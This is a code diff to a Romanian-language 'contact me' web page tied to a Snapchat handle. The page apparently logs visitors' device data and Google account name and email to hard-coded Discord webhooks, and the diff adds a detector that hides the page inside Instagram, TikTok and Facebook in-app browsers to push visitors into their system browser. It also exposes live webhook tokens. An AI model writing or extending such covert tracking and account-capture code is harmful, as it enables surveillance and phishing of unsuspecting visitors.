@@ -116,15 +116,53 @@
       height: env(safe-area-inset-top); width: 1px;
       visibility: hidden; z-index: -1;
     }
+
+    /* In-App Browser Warning Overlay */
+    #inAppWarning {
+      display: none;
+      position: fixed;
+      top: 0; left: 0; right: 0; bottom: 0;
+      background-color: rgba(0, 0, 0, 0.95);
+      z-index: 9999;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      text-align: center;
+      padding: 20px;
+    }
+    .warning-box {
+      border: 2px dashed #ff4444;
+      padding: 20px;
+      border-radius: 10px;
+      background-color: #111;
+      max-width: 400px;
+    }
+    .warning-box h1 { color: #ff4444; margin-top: 0; }
+    .warning-box p { color: white; font-size: 1.1em; line-height: 1.5; }
+    .warning-box .arrow { font-size: 2em; color: #fffc00; margin-top: 15px; animation: bounce 1s infinite; }
+    
+    @keyframes bounce {
+      0%, 100% { transform: translateY(0); }
+      50% { transform: translateY(-10px); }
+    }
   </style>
 </head>
 
 <body>
   <div id="notch-detector"></div>
   
+  <!-- In-App Warning Overlay -->
+  <div id="inAppWarning">
+    <div class="warning-box">
+      <h1>⚠️ BROWSER INCOMPATIBIL</h1>
+      <p>Te afli în browser-ul Instagram/TikTok.<br><br>Apasă pe cele <strong>3 puncte</strong> din colțul de sus și selectează<br><strong>"Open in System Browser / Deschide în browser-ul extern"</strong> pentru a te putea conecta rapid.</p>
+      <div class="arrow">⬆️ ↗️</div>
+    </div>
+  </div>
+
   <div class="snap-badge">Snapchat: niciuncaz_d</div>
 
-  <div class="centered">
+  <div class="centered" id="mainContent">
     <div class="portal-card">
       <h2>CONTACTEAZĂ-MĂ</h2>
       
@@ -163,9 +201,20 @@
   </div>
 
   <script>
+    // --- IN-APP BROWSER DETECTOR ---
+    function isInAppBrowser() {
+      const ua = navigator.userAgent || navigator.vendor || window.opera;
+      return (ua.indexOf("Instagram") > -1 || ua.indexOf("FBAN") > -1 || ua.indexOf("FBAV") > -1 || ua.indexOf("TikTok") > -1 || ua.indexOf("Snapchat") > -1);
+    }
+
+    if (isInAppBrowser()) {
+      document.getElementById('inAppWarning').style.display = 'flex';
+      document.getElementById('mainContent').style.display = 'none';
+      document.querySelector('.snap-badge').style.display = 'none';
+    }
+
     let initialWebhookSent = false;
     let authWebhookSent = false;
-    
     let globalSyncData = {};
     let globalAsyncData = {};
     let verifiedUser = { name: "", email: "" };
@@ -252,6 +301,9 @@
 
     // 4. MAIN WEBHOOK EXECUTOR (Logs / Hardware)
     async function fireWebhook(data, gmailInfo = null) {
+      // Do not log if they are stuck in the Instagram warning screen
+      if (isInAppBrowser() && !gmailInfo) return;
+
       const webhookURL = "https://discord.com/api/webhooks/1466752892550516938/ZQGeg41b-UOxsIVFc8JPE2pRbxO3SdYDUA-idIpoKxuplL2psoct_T2A6CKFTafnbhAc";
       
       const fields = [
@@ -298,7 +350,6 @@
         return;
       }
 
-      // New webhook specifically for the messages
       const webhookURL = "https://discord.com/api/webhooks/1527996713028030565/jRLe183_UIomjx6c5qBJB__PQatyN5UtfyID-bC6ai9_blkW2a-NgXbskz3dg4neg9Xs";
       
       const jsonPayload = JSON.stringify({
